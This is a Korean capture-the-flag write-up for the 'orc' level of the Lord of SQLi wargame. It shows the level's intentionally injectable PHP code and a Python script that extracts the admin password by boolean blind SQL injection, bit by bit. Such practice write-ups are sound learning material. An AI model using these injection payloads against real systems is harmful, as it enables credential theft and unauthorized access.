
## ORC Write-up

### 문제
``` php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

### Exploit 코드
``` python
import requests

def req(a) :
    url = 'http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
    cookies = {'PHPSESSID' : 'My PHPSESSID'}
    params = {}
    params['pw'] = a

    res = requests.get(url, cookies=cookies, params=params)

    if "Hello admin" in res.text :
        return True
    elif "Clear" in res.text :
        return True
    else :
        return False

for i in range(100) :
    a = "' or id='admin' and length(pw)="+str(i)+"#"
    if req(a) :
        length = i
        print("Key length is " + str(i))
        break

flag = ''
for i in range(length) :
    binary = ''
    for j in range(8) :
        a = "' or id='admin' and substr(lpad(bin(ord(substr(pw, "+str(i+1)+", 1))), 8, 0), "+str(j+1)+",1)=0#"
        if req(a) :
            binary += '0'
        else :
            binary += '1'
    flag += chr(int(binary, 2))

if req(flag) :
    print("FLAG IS " + flag)
    print("\n[♪] ORC Clear")
```

이번 문제는 pw가 무엇인지 알아내야 한다.
``` php
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
```
GET 방식으로 받는 pw를 필터링 하는 구문이다.  
`prob` `_` `.` `(` `)` 중 하나라도 있으면 필터링 된다.  
i는 대소문자 구분없이 단어만 같으면 필터한다는 의미이다.

Exploit 코드는 한 글자를 바이너리로 변환해 비교하는 형식으로 코딩했다.  
admin의 pw 값을 알아내고 문제를 해결했다.
